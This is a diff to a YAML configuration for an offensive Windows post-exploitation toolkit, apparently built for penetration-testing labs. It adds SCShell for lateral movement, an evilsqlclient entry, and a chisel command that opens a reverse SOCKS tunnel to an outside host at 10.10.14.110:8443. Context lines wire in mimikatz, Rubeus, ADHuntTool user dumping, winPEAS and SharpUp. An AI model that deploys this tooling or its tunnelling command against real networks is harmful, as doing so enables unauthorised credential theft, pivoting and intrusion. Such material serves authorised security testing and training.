@@ -30,6 +30,9 @@ ps_tools:
     location: tools/powerview.ps1
   runtxt:
     location: run.txt
+  scshell-ps:
+    location: tools/PowerSharpPack/PowerSharpBinaries/Invoke-SCShell.ps1
+    cmd: Invoke-SCShell -Command ""
   seatbelt-ps:
     location: tools/PowerSharpPack/PowerSharpBinaries/Invoke-Seatbelt.ps1
     cmd: Invoke-Seatbelt -Command "-group=system"
@@ -61,11 +64,20 @@ zip_tools:
   mimikatz:
     location: tools/mimikatz.zip
 
+exe_tools:
+  chisel:
+    location: tools/chisel.exe
+    cmd: "client http://10.10.14.110:8443 R:1081:socks"
+
 cs_tools:
   adhunttool:
     location: tools/ADHuntTool.exe
     class: ADHuntTool.Program
     cmd: DumpAllUsers RingZer0
+  evilsqlclient:
+    location: tools/esc.exe
+    class: evilsqlclient.Program
+    cmd: " "
   winpeas:
     location: tools/winPEASx64.exe
     class: winPEAS.Program
@@ -88,6 +100,9 @@ cs_tools:
     location: tools/Rubeus.exe
     class: Rubeus.Program
     cmd: triage
+  scshell:
+    location: tools/SharpSCShell.exe
+    class: SharpSCShell.Program
   seatbelt:
     location: tools/Seatbelt.exe
     class: Seatbelt.Program
@@ -104,6 +119,7 @@ cs_tools:
   sqlclient:
     location: tools/SQLClient.exe
     class: SQLClient.Program
+    cmd: " "
   sharpup:
     location: tools/SharpUp.exe
     class: SharpUp.Program
